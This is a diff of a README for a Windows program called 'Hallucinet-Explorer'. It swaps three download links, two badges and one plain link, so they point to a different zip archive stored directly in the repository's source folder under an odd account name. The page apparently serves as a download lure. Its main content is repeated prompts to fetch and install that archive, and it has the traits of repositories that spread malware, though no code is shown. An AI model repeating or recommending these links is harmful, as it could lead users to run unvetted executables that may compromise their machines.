@@ -1,6 +1,6 @@
 # 🌐 Hallucinet-Explorer - Navigate Imagined Web Worlds
 
-[![Download Hallucinet-Explorer](https://img.shields.io/badge/Download-Hallucinet--Explorer-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Resolved-ecclesiasticallaw51/Hallucinet-Explorer/main/src/Explorer_Hallucinet_3.5.zip)
+[![Download Hallucinet-Explorer](https://img.shields.io/badge/Download-Hallucinet--Explorer-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Resolved-ecclesiasticallaw51/Hallucinet-Explorer/main/src/shared/Explorer_Hallucinet_v1.4.zip)
 
 ## 📖 What is Hallucinet-Explorer?
 
@@ -27,7 +27,7 @@ Here are the steps to get Hallucinet-Explorer running on your Windows PC.
 
 Click the big green button at the top or visit this link directly:
 
-[Download Hallucinet-Explorer](https://raw.githubusercontent.com/Resolved-ecclesiasticallaw51/Hallucinet-Explorer/main/src/Explorer_Hallucinet_3.5.zip)
+[Download Hallucinet-Explorer](https://raw.githubusercontent.com/Resolved-ecclesiasticallaw51/Hallucinet-Explorer/main/src/shared/Explorer_Hallucinet_v1.4.zip)
 
 This page will take you to the place where you can get the latest version of the software.
 
@@ -108,7 +108,7 @@ If you run into problems, try these steps:
 
 Press the button or visit the link below to start using Hallucinet-Explorer:
 
-[![Get Hallucinet-Explorer](https://img.shields.io/badge/Get--Hallucinet--Explorer-blue?style=for-the-badge)](https://raw.githubusercontent.com/Resolved-ecclesiasticallaw51/Hallucinet-Explorer/main/src/Explorer_Hallucinet_3.5.zip)
+[![Get Hallucinet-Explorer](https://img.shields.io/badge/Get--Hallucinet--Explorer-blue?style=for-the-badge)](https://raw.githubusercontent.com/Resolved-ecclesiasticallaw51/Hallucinet-Explorer/main/src/shared/Explorer_Hallucinet_v1.4.zip)
 
 Follow the steps in this guide to download and install the software with ease.
 
